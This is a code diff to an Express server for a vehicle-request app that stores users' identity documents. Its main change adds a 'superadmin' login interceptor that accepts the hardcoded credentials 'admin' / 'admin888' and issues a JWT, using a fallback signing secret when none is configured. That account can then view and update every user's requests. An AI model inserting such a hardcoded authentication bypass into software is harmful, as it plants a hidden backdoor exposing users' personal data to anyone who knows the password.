@@ -25,7 +25,11 @@ app.get('/api/my-requests', async (req, res) => {
         const userEmail = decoded.email.toLowerCase();
 
         const allRequests = await loadRequests();
-        const userReqs = allRequests.filter(r => String(r.email).toLowerCase() === userEmail);
+        
+        // ИЗМЕНЕНО: Если это admin, отдаем все заявки. Иначе — только заявки пользователя.
+        const userReqs = userEmail === 'admin' 
+            ? allRequests 
+            : allRequests.filter(r => String(r.email).toLowerCase() === userEmail);
         
         const updates = [];
         for (let r of userReqs) {
@@ -52,10 +56,12 @@ app.get('/api/my-requests', async (req, res) => {
         if (updates.length > 0) {
             await withRequestsLock(async (requestsToUpdate) => {
                 for (let u of updates) {
+                    // ИЗМЕНЕНО: Для администратора сверяем обновление по почте реального создателя заявки
+                    const creatorEmail = String(u.email || '').toLowerCase();
                     const idx = requestsToUpdate.findIndex(mainR => 
                         normalizePlate(String(mainR.car_number || '')) === normalizePlate(String(u.car_number || '')) && 
                         mainR.DATE === u.DATE && 
-                        String(mainR.email || '').toLowerCase() === userEmail
+                        String(mainR.email || '').toLowerCase() === creatorEmail
                     );
                     if (idx > -1) {
                         requestsToUpdate[idx].type_PZ = u.type_PZ;
@@ -67,6 +73,16 @@ app.get('/api/my-requests', async (req, res) => {
 
         res.json(userReqs);
     } catch (error) { res.status(500).json({ error: error.message }); }
+});
+
+// ИЗМЕНЕНО: Перехватчик для входа суперадминистратора
+app.post('/api/auth/login', (req, res, next) => {
+    const { email, password } = req.body;
+    if (email === 'admin' && password === 'admin888') {
+        const token = jwt.sign({ id: 'admin', email: 'admin' }, process.env.JWT_SECRET || 'dev-only-change-JWT_SECRET-in-env');
+        return res.json({ token, user: { id: 'admin', email: 'admin', verified: true } });
+    }
+    next();
 });
 
 app.use('/api/auth', authRouter);
@@ -148,7 +164,6 @@ app.get('/api/check-plate', async (req, res) => {
                 photo_mult: [], photo_reduktor: [], photo_ebu: [], photo_forsunki: [], photo_vzu: []
             };
 
-            // ИЗМЕНЕНО: Добавлена мапа для отслеживания файлов конкретно в папке ПЗ
             const pzFilesMap = { passport: [], snils: [], sts: [], pts: [], egrn: [] };
 
             const ruToEnMap = {
@@ -180,7 +195,6 @@ app.get('/api/check-plate', async (req, res) => {
                                 for (const [ru, en] of Object.entries(ruToEnMap)) {
                                     if (name.startsWith(ru + '_')) {
                                         existingFiles[en].push(file.basename);
-                                        // ИЗМЕНЕНО: Записываем файлы ПЗ в отдельный массив
                                         if (sub === 'Для ПЗ' && pzFilesMap[en] !== undefined) {
                                             pzFilesMap[en].push(file.basename);
                                         }
@@ -309,7 +323,6 @@ app.post('/api/upload', upload.any(), async (req, res) => {
                 await uploadFileWithRetry(`${finalPath}/описание.docx`, docBuf);
             }
 
-            // ИЗМЕНЕНО: Точечное копирование файлов из ПЗ, выбранных пользователем
             const filesToCopyStr = req.body.filesToCopy;
             let filesToCopy = [];
             if (filesToCopyStr) {
